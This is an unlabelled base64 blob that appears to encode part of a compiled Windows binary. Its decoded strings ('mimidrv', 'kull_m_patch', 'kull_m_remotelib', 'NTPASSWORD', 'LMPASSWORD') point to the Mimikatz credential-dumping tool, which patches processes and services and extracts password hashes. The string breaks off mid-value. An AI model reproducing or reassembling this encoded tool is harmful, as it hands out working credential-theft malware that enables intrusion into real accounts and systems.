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QBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAVgBlAHIAeQBCAGEAcwBpAGMATQBvAGQAdQBsAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAHMARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaABfAGcAZQBuAGUAcgBpAGMAUAByAG8AYwBlAHMAcwBPAHIAUwBlAHIAdgBpAGMAZQBGAHIAbwBtAEIAdQBpAGwAZAAgADsAIABTAGUAcgB2AGkAYwBlACAAaQBzACAAbgBvAHQAIAByAHUAbgBuAGkAbgBnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAASQBuAGMAbwByAHIAZQBjAHQAIAB2AGUAcgBzAGkAbwBuACAAaQBuACAAcgBlAGYAZQByAGUAbgBjAGUAcwAKAAAAAABRAFcATwBSAEQAAABSAEUAUwBPAFUAUgBDAEUAXwBSAEUAUQBVAEkAUgBFAE0ARQBOAFQAUwBfAEwASQBTAFQAAAAAAEYAVQBMAEwAXwBSAEUAUwBPAFUAUgBDAEUAXwBEAEUAUwBDAFIASQBQAFQATwBSAAAAAABSAEUAUwBPAFUAUgBDAEUAXwBMAEkAUwBUAAAATQBVAEwAVABJAF8AUwBaAAAAAABMAEkATgBLAAAAAABEAFcATwBSAEQAXwBCAEkARwBfAEUATgBEAEkAQQBOAAAAAABEAFcATwBSAEQAAABCAEkATgBBAFIAWQAAAAAARQBYAFAAQQBOAEQAXwBTAFoAAABTAFoAAAAAAE4ATwBOAEUAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AYw